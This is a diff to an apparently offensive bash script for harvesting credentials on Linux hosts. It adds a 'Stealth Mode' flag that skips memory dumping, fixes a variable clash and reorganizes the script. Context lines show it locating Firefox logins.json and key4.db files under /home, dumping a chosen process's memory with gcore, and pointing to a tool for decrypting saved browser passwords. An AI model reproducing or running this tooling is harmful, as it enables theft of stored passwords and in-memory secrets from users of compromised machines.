@@ -1,3 +1,14 @@
+#!/bin/bash
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+MAGENTA='\033[1;35m' # CRITICAL HIT
+CYAN='\033[0;36m'
+NC='\033[0m' 
+
 # --- Variables ---
 OUTPUT_FILE=""
 SKIP_MEMORY=false
@@ -24,22 +35,10 @@ while getopts ":o:mh" opt; do
 done
 
 # --- Output Redirection Logic ---
-# If an output file is specified, we need to pipe stdout to tee
 if [ ! -z "$OUTPUT_FILE" ]; then
     exec > >(tee -i "$OUTPUT_FILE") 2>&1
     echo -e "${GREEN}[+] Logging session to: $OUTPUT_FILE${NC}"
 fi
-
-#!/bin/bash
-
-# Colors
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-MAGENTA='\033[1;35m' # CRITICAL HIT
-CYAN='\033[0;36m'
-NC='\033[0m' 
 
 echo -e "${BLUE}"
 echo "========================================================"
@@ -135,7 +134,9 @@ find /home $EXCLUDES -type f \( -name "logins.json" -o -name "key4.db" \) 2>/dev
 # ------------------------------------------------------------------
 print_header "4. MEMORY DUMPING"
 
-if command -v gcore &>/dev/null; then
+if [ "$SKIP_MEMORY" = true ]; then
+    echo -e "${YELLOW}[!] Skipping Memory Dump (Stealth Mode active)${NC}"
+elif command -v gcore &>/dev/null; then
     echo -e "${YELLOW}[B] Process Memory Dump (Gcore)${NC}"
     echo -e "${RED}[!] WARNING: Dumping memory pauses the target process.${NC}"
     echo -e "${GREEN}[*] Listing interesting processes...${NC}"
@@ -146,10 +147,10 @@ if command -v gcore &>/dev/null; then
     read -p "Enter PID to dump (or ENTER to skip): " target_pid
     
     if [[ -n "$target_pid" ]]; then
-        OUTPUT_FILE="dump_${target_pid}.core"
+        OUTPUT_FILE_DUMP="dump_${target_pid}.core"
         echo -e "${GREEN}[*] Dumping PID $target_pid...${NC}"
         
-        gcore -o "$OUTPUT_FILE" "$target_pid" &>/dev/null
+        gcore -o "$OUTPUT_FILE_DUMP" "$target_pid" &>/dev/null
         REAL_FILE=$(ls dump_${target_pid}.core* 2>/dev/null | head -n 1)
         
         if [[ -f "$REAL_FILE" ]]; then
@@ -216,7 +217,8 @@ for py_cmd in python3 python python2; do
              echo -e "    Download it: https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py"
         fi
         
-     # Stop after finding one valid python version
+        # Stop after finding one valid python version to avoid re-running
+        break 
     fi
 done
 
